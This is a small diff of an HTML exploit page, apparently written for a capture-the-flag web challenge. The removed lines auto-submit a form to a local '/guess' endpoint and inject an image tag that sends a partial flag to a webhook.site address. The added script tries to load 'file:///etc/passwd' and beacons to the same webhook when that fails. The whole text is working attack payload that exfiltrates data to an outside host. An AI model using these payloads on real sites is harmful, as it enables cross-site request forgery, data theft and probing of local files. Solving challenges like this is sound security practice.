@@ -1,10 +1,7 @@
-<form action="http://127.0.0.1:5000/guess" method="POST">
-  <input name="guess" value="NHNC{" />
-  <input name="note" value='<img src="http://webhook.site/84a03765-23d9-4cd6-961b-e43af3653d6a?flag=NHNC{" />' />
-</form>
 <script>
-  document.forms[0].submit();
-  setTimeout(() => {
-    location.href = "http://127.0.0.1:5000/";
-  }, 500);
+  var img = new Image();
+img.src = 'file:///etc/passwd';
+img.onerror = function() {
+  fetch('http://webhook.site/84a03765-23d9-4cd6-961b-e43af3653d6a?leak=file-passwd-error');
+};
 </script>
